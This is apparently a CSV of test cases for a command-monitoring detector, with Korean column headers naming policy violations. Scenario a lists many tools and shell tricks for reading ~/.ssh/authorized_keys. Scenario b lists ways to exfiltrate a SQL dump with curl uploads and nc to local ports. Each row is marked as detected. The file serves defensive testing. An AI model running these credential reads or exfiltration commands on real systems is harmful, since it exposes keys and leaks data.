scenario,step,num,command,detected,허용되지 않은 실행,grep 재귀 탐색 옵션 사용,허용되지 않은 zip 경로,허용되지 않은 cp 경로,잘못된 파일 도구 사용,허용되지 않은 link 경로,허용되지 않은 symlink 경로,허용되지 않은 파일 읽기,허용되지 않은 디렉토리 읽기,허용되지 않은 파일 쓰기,허용되지 않은 파일 옮김,금지된 chmod 경로,허용되지 않은 네트워크 연결,허용되지 않은 경로 삭제,대용량 DB 읽기,대량 파일 열기 (server),대량 파일 열기 (home),디렉토리 재귀 파일 탐색 (server),디렉토리 재귀 파일 탐색 (home),대량 파일 열기 (app),디렉토리 재귀 파일 탐색 (uploads),,,,,,,,,
a,1,1,cat ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,2,xxd ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,3,hexdump ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,4,awk 1 ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,5,head -100 ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,6,"while IFS= read -r line; do printf '%s\n' ""$line""; done < ~/.ssh/authorized_keys",TRUE,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,7,grep . ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,8,find ~/.ssh -name authorized_keys -exec cat {} \;,TRUE,1,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,9,busybox cat ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,10,tr -d '' < ~/.ssh/authorized_keys,TRUE,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,11,sed '' ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,12,strings ~/.ssh/authorized_keys,TRUE,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,13,"printf '%s\n' ""$(<~/.ssh/authorized_keys)""",TRUE,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
a,1,14,data/a/1_1.py,TRUE,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,1,cat /tmp/dump.sql | base64,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,2,"curl -X POST -F ""file=@/tmp/dump.sql"" http://127.0.0.1:12345/upload",TRUE,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,3,"curl -X POST -F ""file=@./dump_.sql"" http://127.0.0.1:12345/upload",TRUE,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,4,nc 127.0.0.1 1234 < /tmp/dump.sql,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
b,1,5,data/3/3_1.py,TRUE,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
